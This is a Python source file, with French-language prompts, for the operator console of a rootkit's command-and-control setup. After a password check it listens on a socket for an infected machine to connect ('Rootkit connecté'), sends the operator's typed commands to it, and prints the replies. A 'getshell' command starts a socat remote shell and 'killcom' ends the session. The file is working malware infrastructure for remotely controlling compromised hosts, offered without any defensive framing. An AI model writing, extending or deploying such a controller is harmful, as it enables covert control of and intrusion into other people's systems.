import socket
import threading
import time
import getpass
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout

from utils.state import (
    HOST, PORT, PASSWORD, command_history, connection_lock
)
from utils.socat_launcher import run_socat_shell
from utils.socket_comm import send_to_server, receive_from_server

def run_cli():
    print("🔐 Authentification requise pour le mode CLI")
    pwd = getpass.getpass("Mot de passe > ")
    if pwd != PASSWORD:
        print("❌ Mot de passe incorrect.")
        return

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print(f"📡 [*] En attente de connexion sur {HOST}:{PORT}...")
    connection, addr = server_socket.accept()
    print(f"✅ [+] Rootkit connecté depuis {addr[0]}")

    def send_commands():
        session = PromptSession("🧠 Vous > ")
        with patch_stdout():
            while True:
                try:
                    line = session.prompt().strip()
                    if not line:
                        continue
                    if line.lower() == "getshell":
                        threading.Thread(target=run_socat_shell).start()
                        time.sleep(1)
                    command_history.append(line)
                    send_to_server(connection, line)
                    if line.lower() == "killcom":
                        print("❌ Fermeture demandée.")
                        return
                except (KeyboardInterrupt, EOFError):
                    print("\n⚠️ Interruption utilisateur.")
                    break
                except Exception as e:
                    print(f"💥 Erreur : {e}")
                    break

    def receive_responses():
        while True:
            received = receive_from_server(connection)
            print(f"🔒 [*] Received: {received}")

    threading.Thread(target=receive_responses, daemon=True).start()
    send_commands()
    connection.close()
    server_socket.close()
    print("🔒 Connexion fermée.")
